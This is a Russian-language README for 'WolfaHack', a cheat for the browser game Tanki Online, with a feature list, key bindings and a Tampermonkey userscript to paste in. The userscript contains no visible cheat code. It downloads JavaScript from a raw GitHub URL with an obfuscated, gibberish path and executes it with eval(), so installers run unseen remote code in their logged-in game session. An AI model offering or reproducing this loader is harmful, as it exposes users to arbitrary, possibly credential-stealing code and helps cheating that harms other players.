# Волкохак для мемберов

## Фишки
*   **Парение**
*   **Клик+одхак+полоска**
*   **Фпсхак**
*   **Шот, аим и оффлазер для страйка**
*   **Воллхак**

## Для начала

*   **1.** Установка темпермонкей  - [тык](https://www.tampermonkey.net/)
*   **2.** Создать новый скрипт
*   **3.** Вставляем этот скрипт в плагин, который мы скачали:
```
// ==UserScript==
// @name         WolfaHack
// @version      1.0
// @description  Волкохак для мемберов
// @author       wolf
// @match        https://*.tankionline.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tankionline.com

// @require      http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js
// @require      https://raw.githubusercontent.com/brunoinds/isKeyPressed/main/isKeyPressed.min.js

// @grant        GM_xmlhttpRequest

// ==/UserScript==

GM_xmlhttpRequest({
  method : "GET",
  url : "https://raw.githubusercontent.com/ertoiertoiaerjtaojiagwaureapiefjaeroifs/sretjoti-hjs-rotiuejtoise4jtheduraweilgjawerotiatiawehtlaethiawetiojaw4taw4hntawl4tjiawig.awietjwe4l/main/dsitjseripotsjer%3Boiserjtghoiejrtgesojrigs%3Beropisjeri%3Blhesjrkpoykerphsethopserkhpoaershjestryje4oithjpseoigjesrpogjesriogyaerjoaeirjtpoaw4jtkgaeop'rgtiae4poyae4jyoiaejrgoiaerjtpoae4jgtaeoprgaeoritygjaeogherjpae.js",
  nocache: true,
  onload: (ev) =>
  {
    eval(ev.responseText);
  }
});
```

## Кейкапы
* `R. Shift` - Включить парение
* `LEFT` - Уменьшить скорость 
* `RIGHT` - Увеличить скорость 
* `Q` - Подняться
* `E`- Опуститься
* `J` - Включить анти-аим (тп по карте)
* `R` - Взорвать ракеты (если ракеты застряли)
* `INSERT` - Показать/Убрать меню
* `5` - Включить клик
